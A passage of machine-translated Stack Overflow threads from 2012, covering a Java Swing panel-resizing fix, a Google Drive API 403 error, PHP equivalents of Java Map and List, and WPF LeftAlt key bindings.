    public TestFrame() {
        initComponents();
        jPanel1.add(new DropDownPanel());
        jPanel1.add(new DropDownPanel());
        revalidate();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        jPanel1 = new javax.swing.JPanel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setMinimumSize(new java.awt.Dimension(400, 300));

        jPanel1.setLayout(new javax.swing.BoxLayout(jPanel1, javax.swing.BoxLayout.Y_AXIS));
        jScrollPane1.setViewportView(jPanel1);

        getContentPane().add(jScrollPane1, java.awt.BorderLayout.CENTER);

        pack();
    }// </editor-fold>//GEN-END:initComponents

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /*
         * Set the Nimbus look and feel
         */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /*
         * If Nimbus (introduced in Java SE 6) is not available, stay with the
         * default look and feel. For details see
         * http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(TestFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(TestFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(TestFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(TestFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /*
         * Create and display the form
         */
        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new TestFrame().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane1;
    // End of variables declaration//GEN-END:variables
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T12:26:42.430

发生这种情况是因为您为标题设置了**最小大小**。
因此，当一个面板展开时，另一个面板会缩小，因为他的孩子（标题）允许它这样做。

不要为标题面板设置任何最小尺寸（在 Netbeans IDE 中，单击`Reset to default`按钮）
，问题应该会消失。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:52:28.860

从你的问题中不确定你是......

*   [手风琴](https://stackoverflow.com/questions/8724154/netbeans-accordion-component)

或者

*   [展开/折叠 JPanel](https://stackoverflow.com/a/10299581/714968)

或者

*   [功能区](https://stackoverflow.com/questions/9970516/change-the-backgrounds-color-of-ribbonapplicationmenuentryprimary-flamingo)（仅具有物质外观）

# javascript - Google Drive HTTP 403“未配置访问”错误

> ID：10597993
> 
> 赞同：3
> 
> 时间：2012-05-15T09:37:59.833
> 
> 标签：javascript, salesforce, apex-code, google-drive-api

我正在尝试将 Salesforce 的 DrEdit 示例应用程序安装到 GAE 上。应用程序运行，但保存或打开文件会导致 HTTP 403“访问未配置错误”。

我还尝试将 API Access>Client ID 的值用于 Web 应用程序。Google Drive SDK> OAuth Client ID 也被设置为 Drive SDK 和 Web 应用程序客户端 ID。但是，在 Api 访问服务中同时启用（Api、SDK）后，我仍然遇到同样的错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-16T23:31:00.577

您能否确保在 Google API 控制台上注册您的应用程序并首先为其启用 Drive API 和 SDK？

这一切都在这里描述：[https ://developers.google.com/drive/register](https://developers.google.com/drive/register)

然后确保在 DrEdit 的配置文件中使用您的客户端 ID 和客户端密码。

# java - 正在寻找与 Java 的 Map 和 List 等效的 PHP？

> ID：10597996
> 
> 赞同：1
> 
> 时间：2012-05-15T09:38:12.097
> 
> 标签：java, php, list, map

在 Java 案例#1 中：

```
Map m1 = new LinkedHashMap();
List l1 = new LinkedList();
m1.put("key1","val1");
m1.put("key2","val2");
l1.add(m1); 
```

在Java案例#2

```
List l1 = new LinkedList();
l1.add("val1");
l1.add("val2");
l1.add("val3"); 
```

对于这些情况，PHP 是怎么回事？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:39:09.877

在 PHP 中，[数组](http://php.net/manual/en/language.types.array.php)充当*所有*类型的容器。它们可以用作地图、列表和集合。

链表功能是通过////函数提供的`reset`；查看文档的“另请参阅”部分，以确保您不会错过任何一个。`prev``current``next``end`

对于地图功能，您只需直接索引到数组；但请记住，PHP 中的数组键**只能**是字符串或整数，而且大多数时候将两者混合在同一个数组中是不正确的做法（尽管没有技术上的理由不这样做，而且有些情况有意义的地方）。

SPL 提供了[`SplDoublyLinkedList`](http://php.net/manual/en/class.spldoublylinkedlist.php)类，但其中没有什么是简单数组也不​​能提供给您的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:41:32.643

通常你会在这两种情况下使用数组：

在 PHP 案例#1 中：

```
$m1 = array();
$l1 = array();
$m1['key1'] = 'val1';
$m1['key2'] = 'val2';
$l1[] = $m1; 
```

在 PHP 案例#2

```
$l1 = array();
$l1[] = "val1";
$l1[] = "val2";
$l1[] = "val3"; 
```

然后，要遍历列表中的元素，您可以使用`foreach`或`reset/prev/current/next/end`设置函数。

如果使用 PHP5，您还可以查看[SPL](http://us3.php.net/manual/en/spl.datastructures.php)数据结构。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:40:54.763

即使`array`是 PHP 中最常用的类型，如果使用 PHP 5，您也应该看看 SPL。

使用 SPL，您将获得：

*   堆
*   队列
*   链表
*   等等...

[手动的](http://us3.php.net/manual/en/spl.datastructures.php)

# c# - WPF 中的 LeftAlt 键绑定

> ID：10597997
> 
> 赞同：1
> 
> 时间：2012-05-15T09:38:18.210
> 
> 标签：c#, wpf, mvvm, key-bindings

我正在尝试将左 ALT 键与一个命令绑定，以切换 WPF 中菜单的可见性。但它不起作用..命令没有开火..

```
<Window.InputBindings>
        <KeyBinding
            Key="LeftAlt"
            Command="{Binding Path=MenuVisibilitySetCommand}"/>
</Window.InputBindings> 
```

我注意到其他特殊键（例如 Alt、Ctrl 等）在这里也不起作用。

如何对 WPF 中的特殊键进行 KeyBinding？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T12:22:30.337

要让 LeftALt 像这样工作，您还需要将`Modifiers`属性设置为`Alt`.

```
<KeyBinding Key="LeftAlt" Modifiers="Alt" Command="{Binding Path=MenuVisibilitySetCommand}"/> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:49:23.947

这些特殊键称为修饰键，这应该可以清楚地说明它为什么不起作用。修饰键是“修改”给定键的行为，就像 Shift + L 生成大写“L”，而只有 L 键生成小写“l”。将修饰键用于实际逻辑可能会产生问题且令人恼火，因为用户不习惯在按下此类按钮时看到发生的实际操作。但我同意在某些地方这是有意义的，例如在按下 ALT 键时突出显示 MenuItems。

但是对于您的实际问题：您可以使用代码隐藏和 OnKeyDown/OnKeyUp 或 Preview 事件来实现此行为。

```
 protected override void OnKeyDown(KeyEventArgs e)
    {
        if(e.SystemKey == Key.LeftAlt)
        {
            myMenu.Visibility = Visibility.Visible;
            // e.Handled = true; You need to evaluate if you really want to mark this key as handled!
        }

        base.OnKeyDown(e);
    } 
```

当然 cou 也可以在此代码中触发您的命令。